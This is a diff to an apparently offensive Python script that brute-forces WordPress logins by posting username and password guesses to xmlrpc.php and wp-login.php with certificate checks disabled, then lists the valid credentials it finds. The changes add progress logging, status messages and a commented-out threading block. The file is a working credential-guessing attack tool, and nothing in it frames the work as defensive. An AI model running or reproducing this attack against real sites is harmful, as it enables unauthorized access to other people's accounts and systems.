@@ -1,5 +1,4 @@
 #!/usr/bin/python3
-
 import requests
 import argparse, logging, sys
 import xml.etree.ElementTree as ET
@@ -11,12 +10,12 @@ def xmlrpc_api():
     global V_CREDS
     try:
         for username in username_list:
-            for password in password_list:
+            for index, password in enumerate(password_list):
                 data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
                 r = s.post(args.url+'/xmlrpc.php', headers=headers, data=data, verify=False)
                 msg = f'{username} : {password}'.replace('\n','')
                 if 'Incorrect username or password.' in r.text:
-                    logging.info(f'Tryed: {msg}')
+                    logging.info(f'{index}][ Tryed: {msg}')
                 else:
                     tree = ET.ElementTree(ET.fromstring(r.content))
                     root = tree.getroot()
@@ -27,7 +26,7 @@ def xmlrpc_api():
                     V_CREDS.append(msg)
 
     except Exception as e:
-        print(f'Brute Force via Xmlrpc  Failed : {e}')
+        print(f'[#] Brute Force via Xmlrpc  Failed : {e}')
         exit(-1)
 
 def loginPage():
@@ -52,25 +51,35 @@ def loginPage():
                     logging.info(f'Tryed: {msg}')
 
     except Exception as e:
-        print(f'Brute Force via Login Page Failed : {e}')
+        print(f' Brute Force via Login Page Failed : {e}')
         exit(-1)
 
 def main():
     print("\n| Start Brute Force Script")
     if ('x' or 'xmlrpc') in args.methode:
+        print('[#] Brute Force via xmlrpc.php')
         r = s.post(args.url+'/xmlrpc.php', headers=headers, verify=False)
         if r.status_code != 200:
             print('XML-RPC services are disabled on this site')
             exit(-1)
         xmlrpc_api()
+
+        # with ThreadPoolExecutor(max_workers=thread) as executor:
+    #     for username in username_list:
+    #         for index, password in enumerate(password_list,start=1):
+    #             future = executor.submit(xmlrpc_api,username,password)
+    #             #future.cancel()
+    #             print(future)
+
     else:
+        print('Brute Force via Login Form')
         r = s.post(args.url+'/wp-login.php', headers=headers, verify=False)
         if r.status_code != 200:
             print('Login Page incorrect')   
             exit(-1)
         loginPage()
     if len(V_CREDS):
-        print('| Findings:\n')
+        print('\n| Findings:')
         for creds in V_CREDS:
             print(creds)
     else:
